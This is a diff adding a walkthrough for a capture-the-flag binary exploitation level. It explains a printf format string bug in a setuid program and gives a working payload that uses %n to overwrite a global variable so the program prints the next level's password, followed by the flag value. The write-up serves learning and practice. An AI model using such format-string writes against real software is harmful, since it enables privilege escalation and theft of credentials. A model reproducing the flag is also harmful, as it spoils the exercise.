@@ -1,0 +1,48 @@
+# Level4 Walkthrough
+
+Binary is setuid `level5`. `main` calls `n`, which reads input and passes it to `p`,
+which calls `printf` on it:
+
+```c
+int m;
+
+void p(char *str) {
+  printf(str);
+}
+
+void n(void) {
+  char buffer[520];
+
+  fgets(buffer, 512, stdin);
+  p(buffer);
+  if (m == 0x1025544)
+    system("/bin/cat /home/user/level5/.pass");
+}
+```
+
+## Vulnerability
+
+Same format string bug as level3: `printf(str)` uses the user input as the format
+string. Here the global `m` must equal `0x1025544` (16930116), and on success the
+binary directly cats the level5 pass (no shell needed).
+
+## Exploitation
+
+- Address of `m`: `0x08049810` (read from `mov eax, [m]`).
+- Offset: `python -c 'print "AAAA" + ".%x"*20' | ./level4` shows `41414141` at the
+  12th position (printf is wrapped in `p`, so the offset is bigger than level3).
+
+Write `0x1025544` into `m` with `%n`. The address is 4 printed chars, so the field
+width is `16930116 - 4 = 16930112`.
+
+```sh
+(python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"'; cat) | ./level4
+```
+
+The `%16930112d` prints ~16M characters; once `m == 0x1025544`, the pass is printed.
+
+Flag:
+
+```txt
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
